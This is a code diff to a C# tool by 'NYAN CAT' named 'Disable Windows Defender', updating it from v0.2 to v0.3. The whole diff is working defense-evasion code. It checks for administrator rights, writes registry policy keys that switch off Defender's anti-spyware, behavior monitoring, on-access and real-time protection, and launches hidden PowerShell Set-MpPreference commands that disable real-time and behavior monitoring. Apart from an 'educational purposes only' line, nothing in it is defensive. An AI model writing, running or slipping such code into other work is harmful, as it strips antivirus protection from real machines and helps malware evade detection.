@@ -5,7 +5,7 @@ using System.Security.Principal;
 using System.Threading;
 
 //       │ Author     : NYAN CAT
-//       │ Name       : Disable Windows Defender v0.2
+//       │ Name       : Disable Windows Defender v0.3
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only. 
@@ -19,43 +19,45 @@ namespace Disable_Windows_Defender
 
             if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
 
-            try
-            {
-                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableAntiSpyware", "00000001", RegistryValueKind.DWord);
-            }
-            catch { }
-
-            try
-            {
-                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableBehaviorMonitoring", "00000001", RegistryValueKind.DWord);
-
-                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableOnAccessProtection", "00000001", RegistryValueKind.DWord);
-
-                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableScanOnRealtimeEnable", "00000001", RegistryValueKind.DWord);
-            }
-            catch { }
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable");
 
             Thread.Sleep(100);
 
+            RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
+
+            Thread.Sleep(100);
+
+            RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
+        }
+
+        private static void RegistryEdit(string regPath, string name)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath,RegistryKeyPermissionCheck.ReadWriteSubTree))
+                {
+                    if (key == null)
+                    {
+                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, "00000001", RegistryValueKind.DWord);
+                        return;
+                    }
+                    if (key.GetValue(name) != (object)"00000001")
+                        key.SetValue(name, "00000001",RegistryValueKind.DWord);
+                }
+            }
+            catch { }
+        }
+
+        private static void RunPS(string args)
+        {
             try
             {
                 ProcessStartInfo ps = new ProcessStartInfo();
                 ps.FileName = "powershell.exe";
-                ps.Arguments = " Set-MpPreference -DisableRealtimeMonitoring $true";
-                ps.WindowStyle = ProcessWindowStyle.Hidden;
-                Process process = new Process();
-                process.StartInfo = ps;
-                process.Start();
-            }
-            catch { }
-
-            Thread.Sleep(100);
-
-            try
-            {
-                ProcessStartInfo ps = new ProcessStartInfo();
-                ps.FileName = "powershell.exe -executionpolicy";
-                ps.Arguments = " Set-MpPreference -DisableBehaviorMonitoring $true";
+                ps.Arguments = args;
                 ps.WindowStyle = ProcessWindowStyle.Hidden;
                 Process process = new Process();
                 process.StartInfo = ps;
